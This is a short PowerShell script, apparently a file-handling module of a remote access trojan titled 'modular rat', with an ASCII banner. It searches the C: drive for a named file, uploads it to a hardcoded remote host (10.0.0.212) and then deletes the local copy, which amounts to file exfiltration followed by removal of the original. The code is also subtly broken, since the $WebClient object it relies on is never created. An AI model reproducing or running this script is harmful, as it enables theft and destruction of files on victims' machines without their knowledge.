$file_name = If ($args[0]) { $args[0] }else { Write-Error "Please specify the file name..." }

function title() {
   Write-Host "
    _ __ ___   ___   __| |_   _| | __ _ _ __   _ __ __ _| |_
   | '_ ` _ \ / _ \ / _` | | | | |/ _` | '__| | '__/ _` | __|
   | | | | | | (_) | (_| | |_| | | (_| | |    | | | (_| | |_
   |_| |_| |_|\___/ \__,_|\__,_|_|\__,_|_|    |_|  \__,_|\__|
   " -ForegroundColor DarkGray
   Write-Host "
                       Module : File Handler
   " -ForegroundColor Blue
   Write-Host "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" -ForegroundColor DarkGray
   Write-Host ""
}



function upload($file_location) {
   $remote_host = "10.0.0.212"
   $Dest = "\\$remote_host\$file_location"
   
   $WebClient.UploadFile($Dest, $file_location)
}

function run() {
   $location = ""
   try {
      $location = Get-Item "$file_name" -ErrorAction Stop
   }
   catch {
      # find file if not saved in current directory
      Write-Host "Error while trying to find file in current directory, will try to find it elsewhere..." -ForegroundColor Red
      $location = Get-Childitem -Path C:\ -Include $file_name -Exclude *.ps1 -File -Recurse -ErrorAction SilentlyContinue
   }
   finally {
      #upload
      upload($location)
      Remove-Item "$location"
   }
}

run